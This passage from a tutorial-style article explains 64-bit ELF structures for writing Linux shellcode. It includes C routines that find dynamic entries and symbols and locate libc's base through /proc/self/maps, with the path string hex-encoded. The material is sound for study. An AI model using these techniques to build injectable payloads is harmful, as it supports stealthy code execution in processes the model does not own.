    <span style='color:#800000; font-weight:bold; '>for</span><span style='color:#808030; '>(</span>i<span style='color:#808030; '>=</span><span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span> i<span style='color:#808030; '>&lt;</span>ehdr<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>e_phnum<span style='color:#800080; '>;</span> i<span style='color:#808030; '>+</span><span style='color:#808030; '>+</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
      <span style='color:#696969; '>// if found</span>
      <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>phdr<span style='color:#808030; '>[</span>i<span style='color:#808030; '>]</span><span style='color:#808030; '>.</span>p_type <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> type<span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
        <span style='color:#696969; '>// return pointer to it</span>
        <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#808030; '>&amp;</span>phdr<span style='color:#808030; '>[</span>i<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>
      <span style='color:#800080; '>}</span>
    <span style='color:#800080; '>}</span>
    <span style='color:#696969; '>// return NULL if not found</span>
    <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#7d0045; '>NULL</span><span style='color:#800080; '>;</span>
<span style='color:#800080; '>}</span>
</pre>

<h3 id="shdr">5.3 Section Headers</h3>

<p>When working with the symbol table, there are only two ways I know of that allow you to calculate the number of entries in the symbol table. The first is by dividing <code>Elf64_Shdr.sh_size</code> for <code>SHT_SYMTAB</code> or <code>SHT_DYNSYM</code> by <code>sizeof(Elf64_Sym)</code> or <code>DT_SYMENT</code> from the dynamic section. The other way is using the <code>nchain</code> value from <code>DT_HASH</code>. The problem is that <code>DT_HASH</code> is not always available because of it being replaced by <code>DT_GNU_HASH</code> that does not indicate how many entries are in the symbol table. For the shellcode, I use a method that works for both static and dynamically linked binaries, but it requires opening the file on disk and mapping into memory.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> <span style='color:#800080; '>{</span>
       Elf64_Word      sh_name<span style='color:#800080; '>;</span>       <span style='color:#696969; '>/* index to name of section in string table */</span>
       Elf64_Word      sh_type<span style='color:#800080; '>;</span>       <span style='color:#696969; '>/* type of section                          */</span>
       Elf64_Xword     sh_flags<span style='color:#800080; '>;</span>      <span style='color:#696969; '>/* section flags                            */</span>
       Elf64_Addr      sh_addr<span style='color:#800080; '>;</span>       <span style='color:#696969; '>/* memory address of section                */</span>
       Elf64_Off       sh_offset<span style='color:#800080; '>;</span>     <span style='color:#696969; '>/* file offset for section                  */</span>
       Elf64_Xword     sh_size<span style='color:#800080; '>;</span>       <span style='color:#696969; '>/* size of section                          */</span>
       Elf64_Word      sh_link<span style='color:#800080; '>;</span>       <span style='color:#696969; '>/* index to associated                      */</span>
       Elf64_Word      sh_info<span style='color:#800080; '>;</span>       <span style='color:#696969; '>/* extra info about section                 */</span>
       Elf64_Xword     sh_addralign<span style='color:#800080; '>;</span>  <span style='color:#696969; '>/* aligned address                          */</span>
       Elf64_Xword     sh_entsize<span style='color:#800080; '>;</span>    <span style='color:#696969; '>/* size of entry if section is a table      */</span>
<span style='color:#800080; '>}</span> Elf64_Shdr<span style='color:#800080; '>;</span>
</pre>

<p>The only fields required here are <code>sh_type</code>, <code>sh_offset</code>, <code>sh_size</code> and <code>sh_link</code>. An example of processing the symbol table via section headers is in <code>get_proc_address3</code>.</p>

<h3 id="dyn">5.4 Dynamic Structure</h3>

<p>The <code>.dynamic</code> section contains a list of dynamic entries each of which can be interepreted using the following structure.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> <span style='color:#800080; '>{</span>
  Elf64_Sxword  d_tag<span style='color:#800080; '>;</span>              <span style='color:#696969; '>/* Entry type.    */</span>
  <span style='color:#800000; font-weight:bold; '>union</span> <span style='color:#800080; '>{</span>
    Elf64_Xword d_val<span style='color:#800080; '>;</span>              <span style='color:#696969; '>/* Integer value. */</span>
    Elf64_Addr  d_ptr<span style='color:#800080; '>;</span>              <span style='color:#696969; '>/* Address value. */</span>
  <span style='color:#800080; '>}</span> d_un<span style='color:#800080; '>;</span>
<span style='color:#800080; '>}</span> Elf64_Dyn<span style='color:#800080; '>;</span>
</pre>

<p>The following <code>d_tag</code> values can be used to find specific types. A <code>d_tag</code> value of <code>DT_NULL</code> indicates where the section ends.</p>

<table border cellspacing=0>
<th><b>Type</b></th>
<th><b>Description</b></th>
<th><b>Value</b></th>
<th><code>d_un</code></th>
<tr>
<td><code>DT_PLTGOT</code></td>
<td>Pointer to the Procedure Linkage Table / Global Offset Table</td>
<td align=right><code>3</code></td>
<td><code>d_ptr</code></td>
</tr>
<tr>
<td><code>DT_HASH</code></td>
<td>ELF hash used to locate symbol.</td>
<td align=right><code>4</code></td>
<td><code>d_ptr</code></td>
</tr>
<tr>
<td><code>DT_GNU_HASH</code></td>
<td>GNU style hash used to locate symbol.</td>
<td align=right><code>0x6ffffef5</code></td>
<td><code>d_ptr</code></td>
</tr>
<tr>
<td><code>DT_STRTAB</code></td>
<td>Pointer to the string table.</td>
<td align=right><code>5</code></td>
<td><code>d_ptr</code></td>
</tr>
<tr>
<td><code>DT_SYMTAB</code></td>
<td>Pointer to the symbol table</td>
<td align=right><code>6</code></td>
<td><code>d_ptr</code></td>
</tr>
<tr>
<td><code>DT_SYMENT</code></td>
<td>The size of a symbol entry</td>
<td align=right><code>11</code></td>
<td><code>d_val</code></td>
</tr>
<tr>
<td><code>DT_SONAME</code></td>
<td>Index in string table to the Shared Object name</td>
<td align=right><code>14</code></td>
<td><code>d_val</code></td>
</tr>
<tr>
<td><code>DT_DEBUG</code></td>
<td>Pointer to an <code>r_debug</code> structure containing the <code>link_map</code></td>
<td align=right><code>21</code></td>
<td><code>d_ptr</code></td>
</tr>
</table>

<pre>
Dynamic section at offset 0x1edb8 contains 27 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [libselinux.so.1]
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
 0x000000000000000c (INIT)               0x34c8
 0x000000000000000d (FINI)               0x15c4c
 0x0000000000000019 (INIT_ARRAY)         0x21e388
 0x000000000000001b (INIT_ARRAYSZ)       8 (bytes)
 0x000000000000001a (FINI_ARRAY)         0x21e390
 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)
 0x000000006ffffef5 (GNU_HASH)           0x298
 0x0000000000000005 (STRTAB)             0x1010
 0x0000000000000006 (SYMTAB)             0x350
 0x000000000000000a (STRSZ)              1501 (bytes)
 0x000000000000000b (SYMENT)             24 (bytes)
 0x0000000000000015 (DEBUG)              0x0
 0x0000000000000003 (PLTGOT)             0x21f000
 0x0000000000000002 (PLTRELSZ)           2544 (bytes)
 0x0000000000000014 (PLTREL)             RELA
 0x0000000000000017 (JMPREL)             0x2ad8
 0x0000000000000007 (RELA)               0x1770
 0x0000000000000008 (RELASZ)             4968 (bytes)
 0x0000000000000009 (RELAENT)            24 (bytes)
 0x000000006ffffffb (FLAGS_1)            Flags: PIE
 0x000000006ffffffe (VERNEED)            0x1700
 0x000000006fffffff (VERNEEDNUM)         1
 0x000000006ffffff0 (VERSYM)             0x15ee
 0x000000006ffffff9 (RELACOUNT)          192
 0x0000000000000000 (NULL)               0x0
</pre>

<p>Take a look at the following DYNAMIC table <code>.dyntab</code> for libc and notice the type of SONAME. If we wanted to use this string in the calculation of a function address. Obviously, any digits following the actual name "libc.so" would be stripped to avoid conflict with different versions of glibc. Find both <code>DT_STRTAB</code> and <code>DT_SONAME</code>. Add <code>Elf64_Dyn.d_un.d_val</code> for <code>DT_SONAME</code> to the <code>Elf64_Dyn.d_un.d_ptr</code> for <code>DT_STRTAB</code> value and it will give you the address of string in memory.</p>

<pre>
Dynamic section at offset 0x198ba0 contains 26 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [ld-linux-x86-64.so.2]
 0x000000000000000e (SONAME)             Library soname: [libc.so.6]
 .....
</pre>

<p>The following code is used to locate a dynamic type.</p>

<pre style='color:#000000;background:#ffffff;'>uint64_t elf_get_delta<span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>base<span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
    Elf64_Phdr <span style='color:#808030; '>*</span>phdr<span style='color:#800080; '>;</span>
    uint64_t   low<span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// get pointer to PT_LOAD header</span>
    <span style='color:#696969; '>// first should be executable</span>
    phdr <span style='color:#808030; '>=</span> elf_get_phdr<span style='color:#808030; '>(</span>base<span style='color:#808030; '>,</span> PT_LOAD<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    
    <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>phdr <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
      low <span style='color:#808030; '>=</span> phdr<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>p_vaddr<span style='color:#800080; '>;</span>
    <span style='color:#800080; '>}</span>
    <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#808030; '>(</span>uint64_t<span style='color:#808030; '>)</span>base <span style='color:#808030; '>-</span> low<span style='color:#800080; '>;</span>
<span style='color:#800080; '>}</span>

<span style='color:#696969; '>// return pointer to first dynamic type found</span>
Elf64_Dyn <span style='color:#808030; '>*</span>elf_get_dyn<span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>base<span style='color:#808030; '>,</span> <span style='color:#800000; font-weight:bold; '>int</span> tag<span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
    Elf64_Phdr <span style='color:#808030; '>*</span>dynamic<span style='color:#800080; '>;</span>
    Elf64_Dyn  <span style='color:#808030; '>*</span>entry<span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// 1. obtain pointer to DYNAMIC program header</span>
    dynamic <span style='color:#808030; '>=</span> elf_get_phdr<span style='color:#808030; '>(</span>base<span style='color:#808030; '>,</span> PT_DYNAMIC<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>

    <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>dynamic <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> <span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
      entry <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span>Elf64_Dyn<span style='color:#808030; '>*</span><span style='color:#808030; '>)</span><span style='color:#808030; '>(</span>dynamic<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>p_vaddr <span style='color:#808030; '>+</span> elf_get_delta<span style='color:#808030; '>(</span>base<span style='color:#808030; '>)</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
      <span style='color:#696969; '>// 2. obtain pointer to type</span>
      <span style='color:#800000; font-weight:bold; '>while</span><span style='color:#808030; '>(</span>entry<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>d_tag <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> DT_NULL<span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
        <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>entry<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>d_tag <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> tag<span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
          <span style='color:#800000; font-weight:bold; '>return</span> entry<span style='color:#800080; '>;</span>
        <span style='color:#800080; '>}</span>
        entry<span style='color:#808030; '>+</span><span style='color:#808030; '>+</span><span style='color:#800080; '>;</span>
      <span style='color:#800080; '>}</span>
    <span style='color:#800080; '>}</span>
    <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#7d0045; '>NULL</span><span style='color:#800080; '>;</span>
<span style='color:#800080; '>}</span>
</pre>

<h3 id="sym">5.5 Symbol Structure</h3>

<p>If a binary is being read from disk, the section headers can be used to calculate the location of the symbol table and how many entries it has. The ELF dynamic linker/loader doesn't map the section headers into memory, so if all you have is the base address, you only have the dynamic section program header (<code>PT_DYNAMIC</code>) to work with. <code>DT_STRTAB</code>, <code>DT_SYMTAB</code>, <code>DT_HASH</code> or <code>DT_GNU_HASH</code> are required for locating address of functions this way. <code>get_proc_address</code> in shows how to lookup by hash.</p>

<p>The symbol and table entries can be identified by checking <code>sh_type</code> of each section header for <code>SHT_SYMTAB</code> or <code>SHT_DYNSYM</code>. You may be asking yourself, what's the difference?. Typically, object files will contain a <code>.symtab</code> section for the linker, but not a <code>.dynsym</code> section. ELF binaries that are dynamically linked will contain <code>.dynsym</code> section, but no <code>.symtab</code> section. However, if the application is statically linked, the binary will only contain <code>.symtab</code> section. In practice, you should check for both simultaneously in the event that only one exists.</p>

<p>If you want to resolve the address of a function for example, you would search the section headers for <code>SHT_SYMTAB</code> or <code>SHT_DYNSYM</code> and then use the sh_link field to obtain section of strings. <code>sh_size / sizeof(Elf64_Sym)</code> will calculate the total number of symbols. The st_name field of each symbol is an index into the string table. Once you find the correct symbol via string comparison or calculating a hash of the string, you return st_value + base which then gives you the address of function in memory. To speed up the process, one can check st_info if it is of type <code>STT_FUNC</code>.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>struct</span> <span style='color:#800080; '>{</span>
  Elf64_Word    st_name<span style='color:#800080; '>;</span>            <span style='color:#696969; '>/* String table index of name.   */</span>
  <span style='color:#800000; font-weight:bold; '>unsigned</span> <span style='color:#800000; font-weight:bold; '>char</span> st_info<span style='color:#800080; '>;</span>            <span style='color:#696969; '>/* Type and binding information. */</span>
  <span style='color:#800000; font-weight:bold; '>unsigned</span> <span style='color:#800000; font-weight:bold; '>char</span> st_other<span style='color:#800080; '>;</span>           <span style='color:#696969; '>/* Reserved (not used).          */</span>
  Elf64_Half    st_shndx<span style='color:#800080; '>;</span>           <span style='color:#696969; '>/* Section index of symbol.      */</span>
  Elf64_Addr    st_value<span style='color:#800080; '>;</span>           <span style='color:#696969; '>/* Symbol value.                 */</span>
  Elf64_Xword   st_size<span style='color:#800080; '>;</span>            <span style='color:#696969; '>/* Size of associated object.    */</span>
<span style='color:#800080; '>}</span> Elf64_Sym<span style='color:#800080; '>;</span>
</pre>

<pre>
Symbol table '.dynsym' contains 136 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __ctype_toupper_loc@GLIBC_2.3 (2)
     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __uflow@GLIBC_2.2.5 (3)
     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND getenv@GLIBC_2.2.5 (3)
     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND sigprocmask@GLIBC_2.2.5 (3)
     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __snprintf_chk@GLIBC_2.3.4 (4)
     6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND raise@GLIBC_2.2.5 (3)
     7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND free@GLIBC_2.2.5 (3)
     8: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND abort@GLIBC_2.2.5 (3)
     9: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __errno_location@GLIBC_2.2.5 (3)
    10: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strncmp@GLIBC_2.2.5 (3)
</pre>


<h3 id="libc_base">6. Base of C Library</h3>

<p>Unfortunately, the address of Libc is not readily available via a thread information block like on Windows. We need to obtain the base address of our host process. This would be easy if our code was running inside a segment of the binary, but if we're running from executable memory allocated by the binary itself, we need an arbitrary address of the code segment. That address is first aligned downwards. The first four bytes are checked for an ELF signature and if it matches, we assume to have the base address. if not, we subtract 1 page (usually 4096 bytes) down and continue until we eventually find the ELF header. The main problem with this approach is when you don't have an address. Brute forcing it would take a long long time. If you don't have an arbitrary address, there are some ways to discover it via /proc filesystem.</p>

<h3 id="libc_procfs">6.1 Process Maps File (procfs)</h3>

<p>A popular method of retrieving the base address of libc in a remote process is via parsing of the /proc/[$pid]/maps file. Replacing [$pid] with "self" will query the current process space. The following code demonstrates how to find the base address of executable code in libc.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>int</span> read_line<span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>int</span> fd<span style='color:#808030; '>,</span> <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span>buf<span style='color:#808030; '>,</span> <span style='color:#800000; font-weight:bold; '>int</span> buflen<span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
    <span style='color:#800000; font-weight:bold; '>int</span>  len<span style='color:#800080; '>;</span>
    
    <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>buflen<span style='color:#808030; '>=</span><span style='color:#808030; '>=</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span> <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>
    
    <span style='color:#800000; font-weight:bold; '>for</span><span style='color:#808030; '>(</span>len<span style='color:#808030; '>=</span><span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span> len <span style='color:#808030; '>&lt;</span> <span style='color:#808030; '>(</span>buflen <span style='color:#808030; '>-</span> <span style='color:#008c00; '>1</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span> len<span style='color:#808030; '>+</span><span style='color:#808030; '>+</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
      <span style='color:#696969; '>// read a byte. exit on error</span>
      <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span><span style='color:#808030; '>!</span>_read<span style='color:#808030; '>(</span>fd<span style='color:#808030; '>,</span> <span style='color:#808030; '>&amp;</span>buf<span style='color:#808030; '>[</span>len<span style='color:#808030; '>]</span><span style='color:#808030; '>,</span> <span style='color:#008c00; '>1</span><span style='color:#808030; '>)</span><span style='color:#808030; '>)</span> <span style='color:#800000; font-weight:bold; '>break</span><span style='color:#800080; '>;</span>
      <span style='color:#696969; '>// exit loop when new line found</span>
      <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>buf<span style='color:#808030; '>[</span>len<span style='color:#808030; '>]</span> <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> <span style='color:#0000e6; '>'\n'</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
        buf<span style='color:#808030; '>[</span>len<span style='color:#808030; '>]</span> <span style='color:#808030; '>=</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>
        <span style='color:#800000; font-weight:bold; '>break</span><span style='color:#800080; '>;</span>
      <span style='color:#800080; '>}</span>
    <span style='color:#800080; '>}</span>
    <span style='color:#800000; font-weight:bold; '>return</span> len<span style='color:#800080; '>;</span>
<span style='color:#800080; '>}</span>

<span style='color:#800000; font-weight:bold; '>int</span> is_exec<span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>char</span> line<span style='color:#808030; '>[</span><span style='color:#808030; '>]</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
    <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span>s <span style='color:#808030; '>=</span> line<span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// find the first space</span>
    <span style='color:#696969; '>// but ensure we don't skip newline or null terminator</span>
    <span style='color:#800000; font-weight:bold; '>while</span><span style='color:#808030; '>(</span><span style='color:#808030; '>*</span>s <span style='color:#808030; '>&amp;</span><span style='color:#808030; '>&amp;</span> <span style='color:#808030; '>*</span>s <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> <span style='color:#0000e6; '>'\n'</span> <span style='color:#808030; '>&amp;</span><span style='color:#808030; '>&amp;</span> <span style='color:#808030; '>*</span>s <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> <span style='color:#0000e6; '>' '</span><span style='color:#808030; '>)</span> s<span style='color:#808030; '>+</span><span style='color:#808030; '>+</span><span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// space?</span>
    <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span><span style='color:#808030; '>*</span>s <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> <span style='color:#0000e6; '>' '</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
      <span style='color:#800000; font-weight:bold; '>do</span> <span style='color:#800080; '>{</span>
        s<span style='color:#808030; '>+</span><span style='color:#808030; '>+</span><span style='color:#800080; '>;</span> <span style='color:#696969; '>// skip 1</span>
        <span style='color:#696969; '>// execute flag?</span>
        <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span><span style='color:#808030; '>*</span>s <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> <span style='color:#0000e6; '>'x'</span><span style='color:#808030; '>)</span> <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#008c00; '>1</span><span style='color:#800080; '>;</span>
      <span style='color:#696969; '>// until we reach null terminator, newline or space</span>
      <span style='color:#800080; '>}</span> <span style='color:#800000; font-weight:bold; '>while</span> <span style='color:#808030; '>(</span><span style='color:#808030; '>*</span>s <span style='color:#808030; '>&amp;</span><span style='color:#808030; '>&amp;</span> <span style='color:#808030; '>*</span>s <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> <span style='color:#0000e6; '>'\n'</span> <span style='color:#808030; '>&amp;</span><span style='color:#808030; '>&amp;</span> <span style='color:#808030; '>*</span>s <span style='color:#808030; '>!</span><span style='color:#808030; '>=</span> <span style='color:#0000e6; '>' '</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    <span style='color:#800080; '>}</span>
    <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>
<span style='color:#800080; '>}</span>

<span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>get_module_handle1<span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>const</span> <span style='color:#800000; font-weight:bold; '>char</span> <span style='color:#808030; '>*</span>module<span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
    <span style='color:#800000; font-weight:bold; '>int</span>  maps<span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>*</span>base<span style='color:#808030; '>=</span><span style='color:#7d0045; '>NULL</span><span style='color:#808030; '>,</span> <span style='color:#808030; '>*</span>start_addr<span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>char</span> line<span style='color:#808030; '>[</span>PATH_MAX<span style='color:#808030; '>]</span><span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>int</span>  str<span style='color:#808030; '>[</span><span style='color:#008c00; '>8</span><span style='color:#808030; '>]</span><span style='color:#808030; '>,</span> len<span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// /proc/self/maps</span>
    str<span style='color:#808030; '>[</span><span style='color:#008c00; '>0</span><span style='color:#808030; '>]</span> <span style='color:#808030; '>=</span> <span style='color:#008000; '>0x6f72702f</span><span style='color:#800080; '>;</span>
    str<span style='color:#808030; '>[</span><span style='color:#008c00; '>1</span><span style='color:#808030; '>]</span> <span style='color:#808030; '>=</span> <span style='color:#008000; '>0x65732f63</span><span style='color:#800080; '>;</span>
    str<span style='color:#808030; '>[</span><span style='color:#008c00; '>2</span><span style='color:#808030; '>]</span> <span style='color:#808030; '>=</span> <span style='color:#008000; '>0x6d2f666c</span><span style='color:#800080; '>;</span>
    str<span style='color:#808030; '>[</span><span style='color:#008c00; '>3</span><span style='color:#808030; '>]</span> <span style='color:#808030; '>=</span> <span style='color:#008000; '>0x00737061</span><span style='color:#800080; '>;</span>
    str<span style='color:#808030; '>[</span><span style='color:#008c00; '>4</span><span style='color:#808030; '>]</span> <span style='color:#808030; '>=</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// 1. open /proc/self/maps</span>
    maps <span style='color:#808030; '>=</span> _open<span style='color:#808030; '>(</span><span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>char</span><span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>str<span style='color:#808030; '>,</span> O_RDONLY<span style='color:#808030; '>,</span> <span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span><span style='color:#808030; '>!</span>maps<span style='color:#808030; '>)</span> <span style='color:#800000; font-weight:bold; '>return</span> <span style='color:#7d0045; '>NULL</span><span style='color:#800080; '>;</span>
    
    <span style='color:#696969; '>// 2. until EOF or module found</span>
    <span style='color:#800000; font-weight:bold; '>for</span><span style='color:#808030; '>(</span><span style='color:#800080; '>;</span><span style='color:#800080; '>;</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
      <span style='color:#696969; '>// 3. read a line</span>
      len <span style='color:#808030; '>=</span> read_line<span style='color:#808030; '>(</span>maps<span style='color:#808030; '>,</span> line<span style='color:#808030; '>,</span> BUFSIZ<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
      <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>len <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> <span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span> <span style='color:#800000; font-weight:bold; '>break</span><span style='color:#800080; '>;</span>
      <span style='color:#696969; '>// 4. remove last character</span>
      line<span style='color:#808030; '>[</span>len<span style='color:#808030; '>]</span> <span style='color:#808030; '>=</span> <span style='color:#008c00; '>0</span><span style='color:#800080; '>;</span>
      <span style='color:#696969; '>// if permissions disallow execution, skip it</span>
      <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span><span style='color:#808030; '>!</span>is_exec<span style='color:#808030; '>(</span>line<span style='color:#808030; '>)</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
        <span style='color:#800000; font-weight:bold; '>continue</span><span style='color:#800080; '>;</span>
      <span style='color:#800080; '>}</span>
      start_addr <span style='color:#808030; '>=</span> <span style='color:#808030; '>(</span><span style='color:#800000; font-weight:bold; '>void</span><span style='color:#808030; '>*</span><span style='color:#808030; '>)</span>hex2bin<span style='color:#808030; '>(</span>line<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
      <span style='color:#696969; '>// 5. first address should be the base of host process</span>
      <span style='color:#696969; '>// if no module is requested, return this address</span>
      <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>module <span style='color:#808030; '>=</span><span style='color:#808030; '>=</span> <span style='color:#008c00; '>0</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
        base <span style='color:#808030; '>=</span> start_addr<span style='color:#800080; '>;</span>
        <span style='color:#800000; font-weight:bold; '>break</span><span style='color:#800080; '>;</span>
      <span style='color:#800080; '>}</span>
      <span style='color:#696969; '>// 6. check if module name is in line</span>
      <span style='color:#800000; font-weight:bold; '>if</span><span style='color:#808030; '>(</span>_strstr<span style='color:#808030; '>(</span>line<span style='color:#808030; '>,</span> module<span style='color:#808030; '>)</span><span style='color:#808030; '>)</span> <span style='color:#800080; '>{</span>
        base <span style='color:#808030; '>=</span> start_addr<span style='color:#800080; '>;</span>
        <span style='color:#800000; font-weight:bold; '>break</span><span style='color:#800080; '>;</span>
      <span style='color:#800080; '>}</span>
    <span style='color:#800080; '>}</span>
    close<span style='color:#808030; '>(</span>maps<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
    <span style='color:#800000; font-weight:bold; '>return</span> base<span style='color:#800080; '>;</span>
<span style='color:#800080; '>}</span>
</pre>

<h3 id="dt_pltgot">6.2 Global Offset Table (DT_PLTGOT)</h3>

<p>In 2002, the grugq published a paper called <a href="https://grugq.github.io/docs/subversiveld.pdf">Cheating the ELF - Subversive Dynamic Linking to Libraries</a> where he describes using the <code>link_map</code> stored in the GOT to resolve the base address of <code>libc.so</code>. In 2007, herm1t shows another way in <a href="https://web.archive.org/web/20170702183136/http://vxheaven.org/herm1t/">INT 0x80? No, thank you!</a> that finds it using the address of libc functions rather than the <code>link_map</code>. Either way works, but the method shown here is based on the grugq paper.</p>

<p>The <code>link_map</code> structure contains a list of shared objects that are loaded into memory, which includes the host process. It can be found in various ways, but the most popular seems to be via <code>DT_PLTGOT</code> and <code>DT_DEBUG</code> program headers.</p>

<table border="1">
  <tr>
    <th>GOT Index</th>
    <th>Description<br></th>
  </tr>
  <tr>
    <td>0</td>
    <td>Relative Virtual Address of .dynamic program header (PT_DYNAMIC)</td>
  </tr>
  <tr>
    <td>1</td>
    <td>Pointer to link_map structure.</td>
  </tr>
  <tr>
    <td>2</td>
    <td>Pointer to _dl_runtime_resolve function in dynamic linker/loader</td>
  </tr>
</table>

<p>The following function will retrieve the address of GOT, extract the <code>link_map</code> and search for the requested module based on string. If no module is provided, the first entry in the list, which happens to be host process is returned. This is similar to how GetModuleHandle() works on windows. However, it's worth nothing that because of how shared objects on linux are named, the module name provided to this function doesn't need to be exact. A partial name is sufficient, but that makes it more prone to return the wrong entry.</p>

